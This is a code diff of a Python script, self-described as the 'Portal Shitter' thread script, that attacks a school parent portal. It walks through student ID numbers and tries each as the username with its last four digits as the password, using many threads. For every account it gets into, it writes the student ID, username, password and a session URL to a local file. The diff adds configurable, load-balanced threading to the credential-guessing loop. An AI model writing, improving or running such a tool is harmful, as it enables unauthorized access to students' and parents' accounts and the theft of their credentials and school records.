@@ -1,14 +1,21 @@
-import requests
+import math
 from colored import fg, attr
 import mechanize
 from bs4 import BeautifulSoup
 import time
-import PyPDF2
 import threading
 import logging
 
+print("Welcome to the Portal Shitter thread script. Please input the amount of threads to be used, the threads will automatically loadbalance. Threads must be greater than 0! 1 is 0 etc.")
+threads = int(input("Threads: "))
 
 def thread(name, xrange, yrange):
+    logging.info("Main    : starting thread " + str(name))
+    if xrange == 0:
+        xrange = 4600000000
+    else:
+        xrange = int("46" + str(xrange))
+    yrange = int("46" + str(yrange))
     for x in range(xrange, yrange):
         br = mechanize.Browser()
         br.set_handle_equiv(True)
@@ -16,10 +23,8 @@ def thread(name, xrange, yrange):
         br.set_handle_referer(True)
         br.set_handle_robots(False)
         green = fg('#00FF00')
-        red = fg('#FF0000')
         orange = fg('#FFFF00')
         res = attr('reset')
-
         class user:
             firstname = "N/A"
             lastname = "N/A"
@@ -41,7 +46,7 @@ def thread(name, xrange, yrange):
         user.studentid = str(x)
         br.form['wrkuser'] = user.studentid
         br.form['wrkpasswd'] = user.studentid[-4:]
-        print("[RUN] Checking %s..." % user.studentid)
+        print("[" + name + "] Checking " + user.studentid + "...")
         response = br.submit()
         try:
             br.select_form(nr=0)
@@ -60,7 +65,7 @@ def thread(name, xrange, yrange):
             user.username = tempCombo[0]
             user.password = tempCombo[1]
             smurf.id = dashboard[69:101]
-            finalSmurf = domain + "/parentportal/PP013.pgm?SmurfId=" + \
+            smurf.full = domain + "/parentportal/PP013.pgm?SmurfId=" + \
                 smurf.id + "&wrkcycle=02&wrkgrd=11&rcyear=2022"
             f = open("./assets/matches.txt", "a")
             f.write("Student ID: " + user.studentid + "\nUsername: "
@@ -80,42 +85,27 @@ def thread(name, xrange, yrange):
                   + "s to process match..." + res)
             pass
 
-
 if __name__ == "__main__":
     format = "%(asctime)s: %(message)s"
     logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
 
-    logging.info("Main    : before creating thread")
-    t1 = threading.Thread(target=thread, args=(1, 4600000000, 4605000000))
-    t2 = threading.Thread(target=thread, args=(1, 4650000001, 4610000000))
-    t3 = threading.Thread(target=thread, args=(1, 4610000001, 4615000000))
-    t4 = threading.Thread(target=thread, args=(1, 4615000001, 4620000000))
-    t5 = threading.Thread(target=thread, args=(1, 4620000001, 4625000000))
-    t6 = threading.Thread(target=thread, args=(1, 4625000001, 4630000000))
-    t7 = threading.Thread(target=thread, args=(1, 4630000001, 4635000000))
-    t8 = threading.Thread(target=thread, args=(1, 4635000000, 4640000000))
-    t9 = threading.Thread(target=thread, args=(1, 4640000001, 4645000000))
-    t10 = threading.Thread(target=thread, args=(1, 4645000001, 4650000000))
-    t11 = threading.Thread(target=thread, args=(1, 4650000001, 4655000000))
-    t12 = threading.Thread(target=thread, args=(1, 4655000001, 4660000000))
-    t13 = threading.Thread(target=thread, args=(1, 4660000001, 4665000000))
-    t14 = threading.Thread(target=thread, args=(1, 4665000001, 4670000000))
+    logging.info("Main    : creating " + str(threads) + " threads")
+    # Use once
+    num = math.floor(99999999 / threads)
 
-    logging.info("Main    : before running thread")
-    t1.start()
-    t2.start()
-    t3.start()
-    t4.start()
-    t5.start()
-    t6.start()
-    t7.start()
-    t8.start()
-    t9.start()
-    t10.start()
-    t11.start()
-    t12.start()
-    t13.start()
-    t14.start()
-    logging.info("Main    : wait for the thread to finish")
-    # x.join()
-    logging.info("Main    : all done")
+    # Generate ranges
+    rerun = 0
+    for x in range(threads):
+        # Generate vars
+        name = "thread" + str(x)
+        xRange = rerun
+        yRange = xRange + num + 1
+        if yRange == 100000000:
+            yRange = 99999999
+
+        # Get ready for next interation
+        rerun = yRange
+
+        # Start the thread
+        t = threading.Thread(target=thread, args=(name, xRange, yRange))
+        t.start()
